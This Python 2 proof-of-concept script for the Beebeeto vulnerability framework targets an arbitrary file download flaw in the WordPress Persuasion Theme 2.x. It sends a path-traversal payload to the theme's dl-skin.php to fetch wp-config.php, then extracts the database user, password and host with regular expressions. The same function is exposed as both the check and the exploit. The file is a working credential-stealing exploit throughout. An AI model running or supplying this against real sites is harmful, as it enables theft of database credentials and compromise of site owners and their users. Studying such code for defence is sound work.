#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0029',  # 由Beebeeto官方编辑
            'name': 'Wordpress Persuasion Theme 2.x 任意文件下载 POC',  # 名称
            'author': 't0nyhj',  # 作者
            'create_date': '2014-09-25',  # 编写日期
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',  # 该漏洞所涉及的协议名称
            'port': [80],  # 该协议常用的端口号，需为int类型
            'layer4_protocol': ['tcp'],  # 该协议所使用的第三层协议
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Wordpress Persuasion Theme',  # 漏洞所涉及的应用名称
            'vul_version': ['2.x'],  # 受漏洞影响的应用版本
            'type': 'Arbitrary File Download',  # 漏洞类型
            'tag': ['Wordpress', 'Persuasion Theme', '任意文件下载漏洞'],  # 漏洞相关tag
            'desc': 'Wordpress Persuasion Theme 2.x 任意文件下载 ，通过此漏洞可以下载服务器上的任意可读文件。',  # 漏洞描述
            'references': ['http://www.exploit-db.com/exploits/30443/',  # 参考链接
                           ],
        },
    }


    @classmethod
    def verify(cls, args):  # 实现验证模式的主函数
        vul_url = '{url}/wp-content/themes/persuasion/lib/scripts/dl-skin.php'.format(url=args['options']['target'])
        payload = {'_mysite_download_skin':'../../../../../wp-config.php', '_mysite_delete_skin_zip':''}
        data = urllib.urlencode(payload)
        if args['options']['verbose']:
            print '[*] {url} - Getting wp-config.php ...'.format(url=args['options']['target'])
        req = urllib2.Request(vul_url, data)
        response = urllib2.urlopen(req).read()
        if 'DB_USER' in response and 'DB_PASSWORD' in response and 'WordPress' in response:
            match_data1 = re.compile('\'DB_USER\'\,(.*)\)')
            match_data2 = re.compile('\'DB_PASSWORD\'\,(.*)\)')
            match_data3 = re.compile('\'DB_HOST\'\,(.*)\)')
            data1 = match_data1.findall(response)
            data2 = match_data2.findall(response)
            data3 = match_data3.findall(response)
            args['success'] = True
            args['poc_ret']['vul_url'] = args['options']['target'] + '/wp-content/themes/persuasion/lib/scripts/dl-skin.php'
            args['poc_ret']['DB_USER'] = data1[0]
            args['poc_ret']['DB_PASSWORD'] = data2[0]
            args['poc_ret']['DB_HOST'] = data3[0]
            return args
        else:
            args['success'] = False
            return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())
